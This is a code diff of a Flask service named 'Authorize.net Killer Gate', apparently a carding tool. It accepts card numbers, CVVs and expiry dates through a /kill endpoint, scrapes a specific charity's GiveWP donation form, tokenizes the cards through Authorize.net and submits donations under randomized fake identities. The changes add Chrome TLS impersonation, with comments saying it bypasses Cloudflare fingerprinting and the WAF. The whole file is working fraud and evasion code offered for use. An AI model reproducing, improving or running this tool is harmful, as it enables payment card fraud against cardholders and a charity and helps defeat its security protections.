@@ -1,24 +1,23 @@
 #!/usr/bin/env python3
 """
 Authorize.net Killer Gate — helpingisraelfund.com
-Port: 8095
+Port: Dynamic (Railway) / 8095 (Local)
 Endpoint: /kill?cc=CC|MM|YY|CVV&amount=10
 DEV: chirgg_911
 """
 
 from flask import Flask, request, jsonify
-import requests
 import json
 import re
 import time
 import random
 import string
 import threading
-from concurrent.futures import ThreadPoolExecutor
-import urllib3
 import os
+from concurrent.futures import ThreadPoolExecutor
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# --- CLOUDFLARE BYPASS (Use curl_cffi instead of requests) ---
+from curl_cffi import requests
 
 app = Flask(__name__)
 
@@ -29,6 +28,8 @@ DONATE = f"{TARGET}/donate/"
 FORM_ID = "306"
 GATEWAY = "authorize"
 
+# We will let curl_cffi impersonate Chrome, so manual User-Agent isn't strictly needed for the TLS layer, 
+# but we keep it for the HTTP headers.
 UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
 
 AUTH_URL = "https://api2.authorize.net/xml/v1/request.api"
@@ -132,8 +133,8 @@ def rand_phone():
 
 def scrape_form(session):
     try:
+        # Curl_cffi session automatically bypasses Cloudflare TLS fingerprinting
         r = session.get(DONATE, headers={
-            "User-Agent": UA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         }, timeout=30, verify=False)
 
@@ -145,7 +146,6 @@ def scrape_form(session):
         min_m = re.search(r'name="give-form-minimum"\s+value="([^"]+)"', html)
         max_m = re.search(r'name="give-form-maximum"\s+value="([^"]+)"', html)
 
-        # route signature from the givewpDonationFormExports blob
         donate_url_m = re.search(r'"donateUrl":"([^"]+)"', html)
         donate_url = donate_url_m.group(1).replace("\\/", "/") if donate_url_m else ""
 
@@ -192,13 +192,13 @@ def tokenize(card_number, expiration, cvv, login_id, client_key, auth_id):
     last_error = None
     for attempt in range(TOKENIZE_RETRIES):
         try:
+            # impersonate="chrome" handles TLS fingerprint for AuthNet too
             r = requests.post(AUTH_URL, data=json.dumps(payload), headers={
-                "User-Agent": UA,
                 "Content-Type": "application/json",
                 "Accept": "application/json",
                 "Origin": TARGET,
                 "Referer": DONATE,
-            }, timeout=30, verify=False)
+            }, timeout=30, verify=False, impersonate="chrome")
 
             try:
                 data = json.loads(r.text.lstrip("\ufeff"))
@@ -316,7 +316,6 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
     city, state, zipc = random.choice(CITIES)
     street = f"{random.randint(100,9999)} {random.choice(STREETS)}"
     email = rand_email(first, last)
-    phone = rand_phone()
 
     tok = tokenize(card_number, expiration, cvv, scraped["login_id"], scraped["client_key"], DEFAULT_AUTH_ID)
     if not tok.get("ok"):
@@ -356,7 +355,6 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
         "give-gateway": GATEWAY,
         "give_authorize_data_descriptor": tok.get("descriptor", ""),
         "give_authorize_data_value": tok.get("value", ""),
-        # fee recovery fields
         "give-fee-mode-enable": "false",
         "give-fee-amount": "0.00",
         "give-fee-status": "disabled",
@@ -366,7 +364,6 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
         "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
     }
 
-    # build the final POST URL — if we have a route signature, include it
     post_url = DONATE
     post_params = {"payment-mode": GATEWAY, "form-id": FORM_ID}
     if scraped.get("route_sig"):
@@ -378,13 +375,13 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
         }
 
     try:
-        sess = requests.Session()
+        # Impersonating Chrome to bypass Cloudflare WAF
+        sess = requests.Session(impersonate="chrome")
         r = sess.post(
             post_url,
             params=post_params,
             data=donation_payload,
             headers={
-                "User-Agent": UA,
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": TARGET,
                 "Referer": f"{DONATE}?form-id={FORM_ID}&payment-mode={GATEWAY}&level-id=custom&custom-amount={amount}",
@@ -420,7 +417,6 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
 def killer(card_number, expiration, cvv, amount=10):
     start = time.time()
 
-    # banned-bins check inside
     if card_number[:6] in BANNED_BINS:
         return {
             "card": f"{card_number}|{expiration[:2]}|20{expiration[-2:]}|{cvv}",
@@ -444,8 +440,8 @@ def killer(card_number, expiration, cvv, amount=10):
         "dev": DEV,
     }
 
-    sess = requests.Session()
-    sess.verify = False
+    # Use curl_cffi Session with Chrome impersonation to get past Cloudflare on the first scrape
+    sess = requests.Session(impersonate="chrome")
     scraped = scrape_form(sess)
 
     if not scraped.get("html_ok"):
@@ -559,18 +555,14 @@ def index():
         "api": "Authorize.net Killer Gate",
         "target": TARGET,
         "endpoint": "/kill?cc=CC|MM|YY|CVV&amount=10",
-        "port": 8095,
-        "attempts": ATTEMPTS,
         "dev": DEV,
     })
 
 
 if __name__ == "__main__":
     print(f"Authnet Killer Gate — {TARGET}")
-    print(f"Port: 8095 | Attempts: {ATTEMPTS}")
-    print("/kill?cc=4111111111111111|12|29|123&amount=10")
     print("Dev: @chirgg_911")
     
-    # Railway dynamic port fix
+    # Railway dynamic port fallback
     port = int(os.environ.get("PORT", 8095))
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
